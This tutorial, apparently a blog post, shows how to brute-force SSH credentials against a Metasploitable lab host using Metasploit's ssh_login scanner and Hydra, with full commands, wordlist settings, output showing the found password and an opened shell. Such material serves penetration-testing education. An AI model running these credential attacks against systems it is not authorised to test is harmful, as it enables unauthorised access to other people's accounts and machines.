### Bruteforce SSH Credentials using Hydra or Metasploit

## Metasploit
The first method we will try out today involves one of Metasploit's auxiliary scanners. First, start the PostgreSQL database with the following command.
`~$ sudo service postgresql start`
Now, we can fire up Metasploit by typing ``msfconsole`` in the terminal.
```
~$ msfconsole
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *
=[ metasploit v5.0.87-dev                          ]
+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
Metasploit tip: Use help <command> to learn more about any command
msf5 >
```

You should see "msf" appear, though, for me, it's "msf5" since I'm using the most recent version, Metasploit 5, which can be upgraded by running the latest version of Kali. It's always a good idea to stay updated in order to take advantage of the latest exploits and tools. Here is the command I use to update:

`~$ sudo apt update && sudo apt dist-upgrade`

Next, after being greeted by the welcome banner for msfconsole, we can find the appropriate module with the search command.

```
msf5 > search ssh
Matching Modules
================
#   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/dos/windows/ssh/sysax_sshd_kexchange              2013-03-17       normal     No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
   1   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                    normal     No     SSH Key Exchange Init Corruption
   2   auxiliary/fuzzers/ssh/ssh_version_15                                         normal     No     SSH 1.5 Version Fuzzer
   3   auxiliary/fuzzers/ssh/ssh_version_2                                          normal     No     SSH 2.0 Version Fuzzer
   4   auxiliary/fuzzers/ssh/ssh_version_corrupt                                    normal     No     SSH Version Corruption
   5   auxiliary/scanner/http/cisco_firepower_login                                 normal     No     Cisco Firepower Management Console 6.0 Login
   6   auxiliary/scanner/http/gitlab_user_enum                     2014-11-21       normal     No     GitLab User Enumeration
   7   auxiliary/scanner/ssh/apache_karaf_command_execution        2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution
   8   auxiliary/scanner/ssh/cerberus_sftp_enumusers               2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration
   9   auxiliary/scanner/ssh/detect_kippo                                           normal     No     Kippo SSH Honeypot Detector
   10  auxiliary/scanner/ssh/eaton_xpert_backdoor                  2018-07-18       normal     No     Eaton Xpert Meter SSH Private Key Exposure Scanner
   11  auxiliary/scanner/ssh/fortinet_backdoor                     2016-01-09       normal     No     Fortinet SSH Backdoor Scanner
   12  auxiliary/scanner/ssh/juniper_backdoor                      2015-12-20       normal     No     Juniper SSH Backdoor Scanner
   13  auxiliary/scanner/ssh/karaf_login                                            normal     No     Apache Karaf Login Utility
   14  auxiliary/scanner/ssh/libssh_auth_bypass                    2018-10-16       normal     No     libssh Authentication Bypass Scanner
   15  auxiliary/scanner/ssh/ssh_enum_git_keys                                      normal     No     Test SSH Github Access
   16  auxiliary/scanner/ssh/ssh_enumusers                                          normal     No     SSH Username Enumeration
   17  auxiliary/scanner/ssh/ssh_identify_pubkeys                                   normal     No     SSH Public Key Acceptance Scanner
   18  auxiliary/scanner/ssh/ssh_login                                              normal     No     SSH Login Check Scanner
   19  auxiliary/scanner/ssh/ssh_login_pubkey                                       normal     No     SSH Public Key Login Scanner
   20  auxiliary/scanner/ssh/ssh_version                                            normal     No     SSH Version Scanner
   21  exploit/apple_ios/ssh/cydia_default_ssh                     2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability
   22  exploit/linux/http/alienvault_exec                          2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
   23  exploit/linux/http/php_imap_open_rce                        2018-10-23       good       Yes    php imap_open Remote Code Execution
   24  exploit/linux/http/symantec_messaging_gateway_exec          2017-04-26       excellent  No     Symantec Messaging Gateway Remote Code Execution
   25  exploit/linux/http/ubiquiti_airos_file_upload               2016-02-13       excellent  No     Ubiquiti airOS Arbitrary File Upload
   26  exploit/linux/local/ptrace_traceme_pkexec_helper            2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit
   27  exploit/linux/ssh/ceragon_fibeair_known_privkey             2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure
   28  exploit/linux/ssh/cisco_ucs_scpuser                         2019-08-21       excellent  No     Cisco UCS Director default scpuser password
   29  exploit/linux/ssh/exagrid_known_privkey                     2016-04-07       excellent  No     ExaGrid Known SSH Key and Default Password
   30  exploit/linux/ssh/f5_bigip_known_privkey                    2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure
   31  exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey  2014-03-17       excellent  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure
   32  exploit/linux/ssh/mercurial_ssh_exec                        2017-04-18       excellent  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec
   33  exploit/linux/ssh/quantum_dxi_known_privkey                 2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure
   34  exploit/linux/ssh/quantum_vmpro_backdoor                    2014-03-17       excellent  No     Quantum vmPRO Backdoor Command
   35  exploit/linux/ssh/solarwinds_lem_exec                       2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution
   36  exploit/linux/ssh/symantec_smg_ssh                          2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
   37  exploit/linux/ssh/vmware_vdp_known_privkey                  2016-12-20       excellent  No     VMware VDP Known SSH Key
   38  exploit/multi/http/git_submodule_command_exec               2017-08-10       excellent  No     Malicious Git HTTP Server For CVE-2017-1000117
   39  exploit/multi/http/gitlab_shell_exec                        2013-11-04       excellent  Yes    Gitlab-shell Code Execution
   40  exploit/multi/ssh/sshexec                                   1999-01-01       manual     No     SSH User Code Execution
   41  exploit/unix/http/schneider_electric_net55xx_encoder        2019-01-25       excellent  Yes    Schneider Electric Pelco Endura NET55XX Encoder
   42  exploit/unix/ssh/array_vxag_vapv_privkey_privesc            2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
   43  exploit/unix/ssh/tectia_passwd_changereq                    2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability
   44  exploit/windows/local/unquoted_service_path                 2001-10-25       excellent  Yes    Windows Unquoted Service Path Privilege Escalation
   45  exploit/windows/ssh/freeftpd_key_exchange                   2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow
   46  exploit/windows/ssh/freesshd_authbypass                     2010-08-11       excellent  Yes    Freesshd Authentication Bypass
   47  exploit/windows/ssh/freesshd_key_exchange                   2006-05-12       average    No     FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow
   48  exploit/windows/ssh/putty_msg_debug                         2002-12-16       normal     No     PuTTY Buffer Overflow
   49  exploit/windows/ssh/securecrt_ssh1                          2002-07-23       average    No     SecureCRT SSH1 Buffer Overflow
   50  exploit/windows/ssh/sysax_ssh_username                      2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow
   51  payload/cmd/unix/reverse_ssh                                                 normal     No     Unix Command Shell, Reverse TCP SSH
   52  post/linux/gather/enum_network                                               normal     No     Linux Gather Network Information
   53  post/linux/manage/sshkey_persistence                                         excellent  No     SSH Key Persistence
   54  post/multi/gather/jenkins_gather                                             normal     No     Jenkins Credential Collector
   55  post/multi/gather/ssh_creds                                                  normal     No     Multi Gather OpenSSH PKI Credentials Collection
   56  post/windows/gather/credentials/mremote                                      normal     No     Windows Gather mRemote Saved Password Extraction
   57  post/windows/gather/enum_putty_saved_sessions                                normal     No     PuTTY Saved Sessions Enumeration Module
   58  post/windows/manage/forward_pageant                                          normal     No     Forward SSH Agent Requests To Remote Pageant
   59  post/windows/manage/install_ssh                                              normal     No     Install OpenSSH for Windows
   60  post/windows/manage/sshkey_persistence                                       good       No     SSH Key Persistence
```

The **ssh_login** module is exactly what we need. Equip it with the **use** command. Afterward, you should see *"msf5 auxiliary(scanner/ssh/ssh_login)"*, so you know you're working inside the right place.

`msf5 > use auxiliary/scanner/ssh/ssh_login`

Then we can type **options** to display the available settings for the scanner.

```
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):
Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts
```
We need to set a few things in order for this to work properly. First, **RHOSTS** is the IP address of our target.
```
msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 172.16.1.102
rhosts => 172.16.1.102
```

Next, `STOP_ON_SUCCESS` will stop after finding valid credentials.
```
msf5 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
stop_on_success => true
```

Then, `USER_FILE` is a list of usernames.

```
msf5 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt
user_file => users.txt
```

And `PASS_FILE` is a list of passwords.

```
msf5 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt
pass_file => passwords.txt
```
Finally, there's `VERBOSE`, which will display all attempts.

```
msf5 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
```

For the user and password files, I used a shortened list containing known credentials for the purpose of this demonstration. In a real attack, you would likely want to use one of the well-known wordlists or a custom one to fit your needs.
We should be all set now. Type `run` at the prompt to kick it off:
```
msf5 auxiliary(scanner/ssh/ssh_login) > run
[-] 172.16.1.102:22 - Failed: 'user:password'
[-] 172.16.1.102:22 - Failed: 'user:Password123'
[-] 172.16.1.102:22 - Failed: 'user:msfadmin'
[-] 172.16.1.102:22 - Failed: 'user:admin'
[-] 172.16.1.102:22 - Failed: 'user:default'
[-] 172.16.1.102:22 - Failed: 'user:root'
[-] 172.16.1.102:22 - Failed: 'user:toor'
[-] 172.16.1.102:22 - Failed: 'user:hello'
[-] 172.16.1.102:22 - Failed: 'user:welcome'
[-] 172.16.1.102:22 - Failed: 'user:hunter2'
[-] 172.16.1.102:22 - Failed: 'msfadmin:password'
[-] 172.16.1.102:22 - Failed: 'msfadmin:Password123'
[+] 172.16.1.102:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 1 opened (172.16.1.100:37615 -> 172.16.1.102:22) at 2020-08-09 15:06:58 -0600
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Since we set the verbose option, we can see all the attempts as they take place. Depending on the number of username and password combinations, this can take quite some time to run.
When valid credentials are found, a success message is displayed and a command shell is opened. It does not automatically drop us in, though, so we can display the current active sessions with the sessions command.
```
msf5 auxiliary(scanner/ssh/ssh_login) > sessions
Active sessions
===============
Id  Name  Type         Information                              Connection
  --  ----  ----         -----------                              ----------
  1         shell linux  SSH msfadmin:msfadmin (172.16.1.102:22)  172.16.1.100:37615 -> 172.16.1.102:22 (172.16.1.102)
```

This says that it is an SSH connection. To interact with this session, use the `-i` flag.

```
msf5 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...
id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
```

Now we are connected to the target via SSH and can run commands like normal.

## Hydra

The next tool we will use is Hydra, a powerful login cracker which is very fast and supports a number of different protocols. To show the help and some basic usage options, simply type hydra in the terminal. (Note, if you were previously in the msf console, make sure you cd out of it before using Hydra.)
```
~$ hydra
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]
Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)
Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.
Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
```

Hydra contains a range of options, but today we will be using the following:
- The -L flag, which specifies a list of login names.
- The -P flag, which specifies a list of passwords.
- ssh://172.16.1.102 — our target and protocol.
- The -t flag set to 4, which sets the number of parallel tasks to run.
Once we kick it off, the tool will display the status of the attack:
`~$ hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4`
```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-09 15:12:47
[DATA] max 4 tasks per 1 server, overall 4 tasks, 90 login tries (l:9/p:10), ~23 tries per task
[DATA] attacking ssh://172.16.1.102:22/
```

After a period of time, it will complete and show us the number of successful logins found.
```
[22][ssh] host: 172.16.1.102   login: msfadmin   password: msfadmin
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 46 to do in 00:02h, 4 active
[STATUS] 42.00 tries/min, 84 tries in 00:02h, 6 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-09 15:15:10
```

Hydra's parallel processing power makes it a good choice when a large number of potential credentials are involved.
